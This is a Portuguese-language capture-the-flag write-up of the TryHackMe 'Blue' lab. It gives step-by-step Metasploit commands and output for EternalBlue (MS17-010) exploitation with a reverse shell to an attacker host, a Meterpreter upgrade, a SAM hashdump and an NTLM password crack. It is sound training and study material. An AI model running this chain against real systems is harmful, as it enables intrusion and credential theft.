# 🔷 Blue — CTF Writeup
### TryHackMe | Boot-to-Root | MS17-010 EternalBlue · SAM Hashdump · Password Cracking

---

| **Analista**          | Mauricio Robert                                                                        |
|-----------------------|----------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                      |
| **Data do Relatório** | 10/08/2026                                                                             |
| **Data do Pentest**   | 10/08/2026 · 01:16 – 01:30 (GMT+0000)                                                  |
| **Alvo**              | `10.66.155.180` (`WIN-JO6REVNMMMP`)  — TryHackMe · Blue                                |
| **Classificação**     | CONFIDENCIAL                                                                           |
| **Ferramentas**       | Nmap 7.99 · Metasploit Framework (`exploit/windows/smb/ms17_010_eternalblue`) · Meterpreter (`hashdump`, `shell_to_meterpreter`) · CrackStation |
| **Plataforma**        | TryHackMe — Boot-to-Root                                                               |

---

## 🔍 Resumo Executivo

Este relatório documenta o comprometimento completo da máquina **Blue** (TryHackMe), um host **Windows Server 2012 R2 Datacenter** (hostname `WIN-JO6REVNMMMP`, build 9600), um dos cenários mais emblemáticos para o estudo da vulnerabilidade **MS17-010 (EternalBlue)**. A cadeia de ataque envolveu: reconhecimento de rede via **Nmap**, identificando um serviço SMB (445/tcp) com **assinatura de mensagens desabilitada** — uma condição clássica associada à exploração do EternalBlue; exploração via **Metasploit** (`exploit/windows/smb/ms17_010_eternalblue`), obtendo uma shell de comando remota diretamente com privilégios de **`NT AUTHORITY\SYSTEM`**; upgrade da sessão para **Meterpreter** através do módulo `post/multi/manage/shell_to_meterpreter`, confirmando o contexto de execução privilegiado; extração dos hashes de senha do banco **SAM** via `hashdump`; quebra offline do hash NTLM do usuário `Jon` através do serviço **CrackStation**, revelando a senha em texto claro; e, por fim, navegação pelo sistema de arquivos para localizar e capturar as **três flags** do desafio, incluindo uma no diretório pessoal do usuário `Jon`.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta                     | Versão  | Finalidade                                                                             |
|---------------------------------|---------|-----------------------------------------------------------------------------------------|
| **Nmap**                        | 7.99    | Varredura de portas, fingerprint de serviços e scripts NSE (`-sV -sC -Pn -T4`)          |
| **Metasploit Framework**        | -       | Exploração do MS17-010 (`exploit/windows/smb/ms17_010_eternalblue`), verificação de vulnerabilidade (`auxiliary/scanner/smb/smb_ms17_010`) |
| **Meterpreter**                 | -       | Upgrade de sessão (`post/multi/manage/shell_to_meterpreter`), extração de hashes (`hashdump`), shell interativa |
| **CrackStation**                | -       | Quebra offline de hash NTLM via lookup table pré-computada                              |

---

## 📋 Fases de Comprometimento

### FASE 1 — Reconhecimento: Varredura Nmap

> **01:16 GMT · Nmap 7.99**

```bash
sudo nmap -sV -sC -Pn -T4 10.66.155.180
```

```
PORT      STATE SERVICE       VERSION
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server 2012 R2 Datacenter 9600 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.0.2:
|_    Message signing enabled but not required
| smb-os-discovery:
|   OS: Windows Server 2012 R2 Datacenter 9600 (Windows Server 2012 R2 Datacenter 6.3)
|   Computer name: WIN-JO6REVNMMMP
|   NetBIOS computer name: WIN-JO6REVNMMMP\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2026-08-09T18:18:15-07:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Nmap done: 1 IP address (1 host up) scanned in 189.30 seconds
```

![Nmap](/CTFs/Blue/images/Nmap_Scan.png)

O host **`WIN-JO6REVNMMMP`** roda **Windows Server 2012 R2 Datacenter** e expõe SMB (445/tcp) com **assinatura de mensagens desabilitada por padrão** (`message_signing: disabled (dangerous, but default)`) — uma configuração clássica que, combinada à ausência de patches de segurança, sinaliza forte suscetibilidade à vulnerabilidade **MS17-010 (EternalBlue)**.

---

### FASE 2 — Exploração: MS17-010 EternalBlue via Metasploit

```bash
msfconsole
```

```
msf > use exploit/windows/smb/ms17_010_eternalblue
msf exploit(windows/smb/ms17_010_eternalblue) > set rhosts 10.66.155.180
msf exploit(windows/smb/ms17_010_eternalblue) > set lhost 192.168.157.47
msf exploit(windows/smb/ms17_010_eternalblue) > show options
```

```
Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting   Required  Description
   ----           ---------------   --------  -----------
   RHOSTS         10.66.155.180     yes       The target host(s)
   RPORT          445               yes       The target port (TCP)

Payload options (windows/x64/shell/reverse_tcp):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   LHOST      192.168.157.47   yes       The listen address
   LPORT      4444             yes       The listen port
```

```bash
exploit
```

```
[*] Started reverse TCP handler on 192.168.157.47:4444
[*] 10.66.155.180:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.66.155.180:445 - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Datacenter 9600 x64 (64-bit)
[*] 10.66.155.180:445 - Scanned 1 of 1 hosts (100% complete)
[+] 10.66.155.180:445 - The target is vulnerable.
[*] 10.66.155.180:445 - shellcode size: 1283
[*] 10.66.155.180:445 - numGroomConn: 12
[*] 10.66.155.180:445 - Target OS: Windows Server 2012 R2 Datacenter 9600
[+] 10.66.155.180:445 - got good NT Trans response
[+] 10.66.155.180:445 - SMB1 session setup allocate nonpaged pool success
[+] 10.66.155.180:445 - good response status for nx: INVALID_PARAMETER
[*] Sending stage (336 bytes) to 10.66.155.180
[*] Command shell session 1 opened (192.168.157.47:4444 -> 10.66.155.180:49203) at 2026-08-10 01:27:26 +0000

Shell Banner:
Microsoft Windows [Version 6.3.9600]
-----

C:\Windows\system32>
```

![Exploit](/CTFs/Blue/images/Exploit_Run.png)
> 🚩 **Acesso inicial obtido — shell de comando remota via exploração do MS17-010 (EternalBlue)**

O próprio exploit já confirma, através do verificador `smb_ms17_010`, que o alvo é **vulnerável ao MS17-010**, entregando uma shell de comando diretamente na primeira tentativa.

---

### FASE 3 — Upgrade de Sessão e Confirmação de Privilégios SYSTEM

Com a shell básica obtida, a sessão foi colocada em segundo plano e convertida para **Meterpreter**, garantindo maior estabilidade e recursos de pós-exploração:

```bash
^Z
Background session 1? [y/N]  y

msf exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter
msf post(multi/manage/shell_to_meterpreter) > set session 1
msf post(multi/manage/shell_to_meterpreter) > exploit
```

```
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 192.168.157.47:4433
[*] Post module execution completed
[*] Sending stage (255678 bytes) to 10.66.155.180
[*] Meterpreter session 2 opened (192.168.157.47:4433 -> 10.66.155.180:49215) at 2026-08-10 01:30:30 +0000
[*] Stopping exploit/multi/handler
```

```bash
sessions -i 2
```

```
meterpreter > sysinfo
Computer        : WIN-JO6REVNMMMP
OS              : Windows Server 2012 R2 (6.3 Build 9600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Meterpreter     : x64/windows
```

Para confirmar o nível de privilégio obtido, uma shell de comando foi aberta a partir do próprio Meterpreter:

```bash
meterpreter > shell
Process 1700 created.
Channel 1 created.

C:\Windows\system32>whoami
nt authority\system
```

![Privesc](/CTFs/Blue/images/PrivEsc.png)
> 🚩 **Privilégio confirmado — o exploit MS17-010 concedeu acesso direto como `NT AUTHORITY\SYSTEM`**, sem necessidade de técnicas adicionais de escalada de privilégios.

---

### FASE 4 — Extração e Quebra de Credenciais: SAM Hashdump

Com acesso Meterpreter privilegiado, o banco de dados **SAM** (Security Account Manager) foi extraído para obtenção dos hashes de senha locais:

```bash
meterpreter > hashdump
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:f3118544a831e728781d780cfdb9c1fa:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1002:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
```

O hash NTLM do usuário **`Jon`** (`ffb43f0de35be4d9917ac0cc8ad57f8d`) foi submetido a um serviço de quebra online baseado em *lookup tables* pré-computadas:

```
crackstation.net

Hash:  ffb43f0de35be4d9917ac0cc8ad57f8d
Type:  NTLM
Result: alqfna22
```

![Password Jon](/CTFs/Blue/images/Crack_Pass_Jon.png)
> 🚨 **Credencial quebrada com sucesso: usuário `Jon`, senha `alqfna22`**

---

### FASE 5 — Enumeração do Sistema de Arquivos e Captura das Flags

Com acesso `SYSTEM` já estabelecido, a fase final consistiu em navegar pelo sistema de arquivos em busca das três flags do desafio.

A primeira flag foi localizada diretamente na raiz de `C:\`:

```bash
C:\>dir
```

```
 Directory of C:\

08/09/2026  06:26 PM    <DIR>          badr
07/31/2026  01:24 PM                24 flag1.txt
08/22/2013  08:52 AM    <DIR>          PerfLogs
07/31/2026  11:33 AM    <DIR>          Program Files
08/22/2013  08:39 AM    <DIR>          Program Files (x86)
07/31/2026  01:28 PM    <DIR>          Users
08/09/2026  06:26 PM    <DIR>          Windows
```

```bash
C:\>type flag1.txt
flag{access_the_machine}
```

![Flag](/CTFs/Blue/images/Flags.png)
> 🚩 **flag1.txt — FLAG CAPTURADA: `flag{access_the_machine}`**

A segunda flag foi localizada dentro do diretório `config` do SAM, no `System32`, reforçando a conexão temática com a etapa de extração de hashes:

```bash
C:\>type C:\Windows\System32\config\flag2.txt
flag{sam_database_elevated_access}
```

> 🚩 **flag2.txt — FLAG CAPTURADA: `flag{sam_database_elevated_access}`**

A terceira flag foi localizada através de uma busca recursiva por todo o disco `C:\`, sendo encontrada nos documentos do usuário **`Jon`** — o mesmo usuário cuja senha havia sido quebrada anteriormente:

```bash
C:\>where /r C:\ flag3.txt
C:\Users\Jon\Documents\flag3.txt

C:\>type C:\Users\Jon\Documents\flag3.txt
flag{admin_documents_can_be_valuable}
```

![Flag](/CTFs/Blue/images/Flags.png)
> 🚩 **flag3.txt — FLAG CAPTURADA: `flag{admin_documents_can_be_valuable}`**

---

## ⛓ Linha do Tempo do Comprometimento

```
[01:16 GMT] FASE 1 — RECONHECIMENTO (Nmap)
    445/tcp SMB · assinatura de mensagens desabilitada (dangerous, but default)
    Host: WIN-JO6REVNMMMP — Windows Server 2012 R2 Datacenter
    ↓
[01:27 GMT] FASE 2 — EXPLORAÇÃO (Metasploit)
    exploit/windows/smb/ms17_010_eternalblue
    Shell de comando obtida — acesso já como SYSTEM
    ↓
[01:30 GMT] FASE 3 — UPGRADE DE SESSÃO (shell_to_meterpreter)
    Meterpreter session 2 aberta
    whoami → nt authority\system (confirmado)
    ↓
[FASE 4] EXTRAÇÃO E QUEBRA DE CREDENCIAIS
    hashdump → Administrator, Guest, Jon (NTLM)
    CrackStation → Jon : alqfna22
    ↓
[FASE 5] ENUMERAÇÃO E CAPTURA DAS FLAGS
    flag1.txt → C:\               → flag{access_the_machine} ✓
    flag2.txt → C:\Windows\System32\config\ → flag{sam_database_elevated_access} ✓
    flag3.txt → C:\Users\Jon\Documents\    → flag{admin_documents_can_be_valuable} ✓
    ↓
COMPROMETIMENTO CONCLUÍDO — acesso total como SYSTEM
```

---

## 🗺 Mapeamento Investigativo

| Fase | Ferramenta/Técnica | Achado |
|------|--------------------|--------|
| Reconhecimento | Nmap | SMB (445) com assinatura desabilitada — host `WIN-JO6REVNMMMP` (Windows Server 2012 R2) |
| Exploração | Metasploit `ms17_010_eternalblue` | Vulnerabilidade confirmada e explorada — shell obtida como SYSTEM |
| Upgrade de Sessão | `post/multi/manage/shell_to_meterpreter` | Sessão Meterpreter estável, `sysinfo` e `whoami` confirmados |
| Extração de Credenciais | Meterpreter `hashdump` | Hashes NTLM de `Administrator`, `Guest` e `Jon` |
| Quebra de Senha | CrackStation | `Jon : alqfna22` |
| Captura de Flags | Navegação no sistema de arquivos | 3 flags capturadas em locais distintos |

---

## 🚨 Artefatos e Indicadores Identificados

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| Alvo | `10.66.155.180` (`WIN-JO6REVNMMMP`) | Máquina Blue (TryHackMe) — Windows Server 2012 R2 Datacenter |
| Serviços expostos | `135,139,445/TCP` (SMB/RPC) · `3389/TCP` (RDP) · `5985/TCP` (WinRM) | Superfície de ataque total |
| Vulnerabilidade explorada | MS17-010 (EternalBlue) | SMBv1 vulnerável, assinatura de mensagens desabilitada |
| Módulo de exploração | `exploit/windows/smb/ms17_010_eternalblue` | Metasploit Framework |
| Contexto obtido | `NT AUTHORITY\SYSTEM` | Privilégio máximo obtido diretamente pelo exploit |
| Usuários do sistema | `Administrator`, `Guest`, `Jon` | Extraídos via `hashdump` do banco SAM |
| Credencial quebrada | `Jon : alqfna22` | Hash NTLM `ffb43f0de35be4d9917ac0cc8ad57f8d` crackeado via CrackStation |
| Flag 1 | `flag{access_the_machine}` | `C:\flag1.txt` |
| Flag 2 | `flag{sam_database_elevated_access}` | `C:\Windows\System32\config\flag2.txt` |
| Flag 3 | `flag{admin_documents_can_be_valuable}` | `C:\Users\Jon\Documents\flag3.txt` |
| Técnica (MITRE ATT&CK) | `T1210` | Exploitation of Remote Services (EternalBlue/SMB) |
| Técnica (MITRE ATT&CK) | `T1003.002` | OS Credential Dumping: Security Account Manager |
| Técnica (MITRE ATT&CK) | `T1110.002` | Brute Force: Password Cracking (offline NTLM) |

---

## ✅ Resumo das Flags

| # | Flag | Valor | Localização |
|---|------|-------|-------------|
| 🚩 Flag 1 | `flag1.txt` | `flag{access_the_machine}` | `C:\flag1.txt` |
| 🚩 Flag 2 | `flag2.txt` | `flag{sam_database_elevated_access}` | `C:\Windows\System32\config\flag2.txt` |
| 🚩 Flag 3 | `flag3.txt` | `flag{admin_documents_can_be_valuable}` | `C:\Users\Jon\Documents\flag3.txt` |

---

## 📚 Referências

- [TryHackMe — Blue](https://tryhackme.com/room/blue)
- [MS17-010 — Microsoft Security Bulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0144 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2017-0144)
- [Rapid7 — ms17_010_eternalblue Metasploit Module](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/)
- [CrackStation — Free Password Hash Cracker](https://crackstation.net/)
- [MITRE ATT&CK T1210 — Exploitation of Remote Services](https://attack.mitre.org/techniques/T1210/)
- [MITRE ATT&CK T1003.002 — Security Account Manager](https://attack.mitre.org/techniques/T1003/002/)
- [MITRE ATT&CK T1110.002 — Password Cracking](https://attack.mitre.org/techniques/T1110/002/)

---